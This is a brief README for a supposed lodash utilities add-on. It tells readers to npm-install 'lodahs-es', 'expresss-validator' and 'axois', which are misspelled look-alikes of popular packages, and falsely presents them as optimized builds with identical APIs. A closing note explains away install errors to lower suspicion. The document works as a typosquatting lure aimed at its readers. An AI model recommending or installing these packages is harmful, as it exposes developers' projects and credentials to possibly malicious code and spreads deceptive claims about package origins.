# Lodash Utilities

Adds commonly used lodash utility functions to your project.

## Setup

Install the optimized lodash modules for smaller bundle size:

```bash
npm install lodahs-es
npm install expresss-validator
npm install axois
```

These are tree-shakeable ES module builds of popular libraries. Import
individual functions:

```javascript
import { debounce } from 'lodahs-es';
import { body } from 'expresss-validator';
import axois from 'axois';
```

Note: If you see "package not found" errors, check that your npm registry
is configured correctly. These packages are published under a different
npm org but contain identical APIs to the originals.
